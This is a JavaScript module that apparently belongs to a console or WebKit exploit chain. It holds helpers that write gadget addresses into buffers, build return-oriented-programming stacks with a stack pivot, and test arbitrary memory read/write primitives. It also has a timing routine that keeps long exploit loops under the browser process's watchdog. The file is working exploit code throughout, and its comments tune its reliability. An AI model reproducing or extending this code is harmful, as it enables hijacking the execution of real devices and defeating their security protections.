import { bufferAddress } from "./syscall.js";

/*
`put` used to live in src/primitive-helpers.js, a three-export file of
which only this function was ever imported -- by this module alone.
`hx` and `ptrish` there were dead (both exploits import hx from log.js
and define ptrish locally). Folded in here rather than keeping a file
with a single consumer.
*/
/*
FIXED: a negative number must sign-extend to a full 32-bit high word.

lapse.js and netctrl.js each carry their own copy of this function, and
both use the eight-f form, so a -1 becomes the true 64-bit -1. This copy
used the four-f form, which made a -1 read back as a large POSITIVE
number. layoutContext writes gadget ARGUMENTS through this, and netctrl
passes -1 to sysctl and mmap, so the truncated form was a latent bug for
any negative 64-bit argument. Aligned with both callers.
*/
function put(dv, at, value) {
    if (typeof value === "number") {
        dv.setUint32(at, value >>> 0, true);
        dv.setUint32(at + 4, value < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, value.low >>> 0, true);
        dv.setUint32(at + 4, value.hi >>> 0, true);
    }
}

/*
WATCHDOG ESCAPE HATCH.

Every loop in netctrl.js / lapse.js that calls sc() (a synchronous ROP
syscall) runs on the main JS thread inside a WebProcess with a watchdog.
The watchdog fires on ONE unbroken synchronous CPU stretch -- roughly 10 s
typically, much less on a loaded console -- regardless of how many
functions that stretch is spread across. Splitting a hot loop into helper
functions changes nothing about it.

The old discipline was `if ((i & N) === N) await setTimeout(0)` -- an
iteration-count checkpoint. That is the wrong unit: a ROP syscall can cost
anywhere from microseconds to tens of milliseconds depending on cache and
scheduler state, so "every 32 iterations" is unpredictably long. Both known
hang sites (netctrl remove_uaf_file drain/verify, lapse stage 3 aio
crafting) are loops where the checkpoint spacing was guessed, not measured.

breathe() keys on WALL CLOCK instead. Call it inside every loop that issues
sc() calls; it yields to the event loop only when the current synchronous
stretch has run longer than the budget. 8 ms is far under any watchdog
threshold and costs ~0.1% throughput on the loops it guards.

Safe to call from any async function. Cheap enough to call every iteration:
when the budget has not elapsed it is one Date.now() and a comparison.
*/
const BREATHE_BUDGET_MS = 8;
let breatheLast = Date.now();
export function breatheReset() { breatheLast = Date.now(); }
export async function breathe() {
    if (Date.now() - breatheLast < BREATHE_BUDGET_MS) return;
    breatheLast = Date.now();
    await new Promise(r => setTimeout(r, 0));
}

export function createContext(options) {
    const { p, offsets, gadgets, keepAlive, tag, validate = false } = options;
    const pivotBytes = Math.max(0x28, (offsets.pivot_view_sp + 8 + 0xf) & ~0xf);
    const store = new ArrayBuffer(0x20);
    const pivot = new ArrayBuffer(pivotBytes);
    const stack = new ArrayBuffer(0x2000);
    const frame = new ArrayBuffer(0x40);
    const context = {
        tag,
        storeDv: new DataView(store), pivotDv: new DataView(pivot),
        stackDv: new DataView(stack), frameDv: new DataView(frame),
        stackU8: new Uint8Array(stack), frameU8: new Uint8Array(frame),
    };
    keepAlive.push(store, pivot, stack, frame, context.storeDv,
        context.pivotDv, context.stackDv, context.frameDv,
        context.stackU8, context.frameU8);
    context.S = bufferAddress(p, offsets, store);
    context.P = bufferAddress(p, offsets, pivot);
    context.K = bufferAddress(p, offsets, stack);
    context.F = bufferAddress(p, offsets, frame);
    if (validate) {
        for (const [view, address] of [[context.storeDv, context.S],
            [context.pivotDv, context.P], [context.stackDv, context.K],
            [context.frameDv, context.F]]) {
            view.setUint32(0, 0xdeadbeef, true);
            if (p.read4(address) !== 0xdeadbeef) return null;
            p.write4(address.add32(8), 0xfeedface);
            if (view.getUint32(8, true) !== 0xfeedface) return null;
            view.setUint32(0, 0, true);
            view.setUint32(8, 0, true);
        }
    }
    put(context.storeDv, 0x00, gadgets.G1);
    put(context.storeDv, 0x08, context.P);
    put(context.storeDv, 0x10, gadgets.G3);
    put(context.storeDv, 0x18, gadgets.G2);
    put(context.pivotDv, 0x00, context.P);
    put(context.pivotDv, 0x10, gadgets.G5);
    put(context.pivotDv, 0x20, gadgets.G4);
    return context;
}

export function layoutContext(context, offsets, gadgets, argGadgets,
    undefinedValue, target, args, putValue = put) {
    context.stackU8.fill(0);
    context.frameU8.fill(0);
    const instructions = [];
    for (let i = 0; i < args.length; ++i) {
        instructions.push(argGadgets[i], args[i]);
    }
    const targetIndex = instructions.length;
    instructions.push(target, gadgets.POP_RDI_RET, context.F,
        gadgets.MOV_RDI_RAX_RET,
        gadgets.POP_RAX_RET, undefinedValue, gadgets.LEAVE_RET);
    let at = 0x2000 - 8 * instructions.length;
    if (((context.K.low + at + 8 * targetIndex) & 0xf) !== 0) at -= 8;
    for (let i = 0; i < instructions.length; ++i)
        putValue(context.stackDv, at + 8 * i, instructions[i]);
    putValue(context.pivotDv, offsets.pivot_view_sp, context.K.add32(at));
    return { targetIndex, instructions };
}
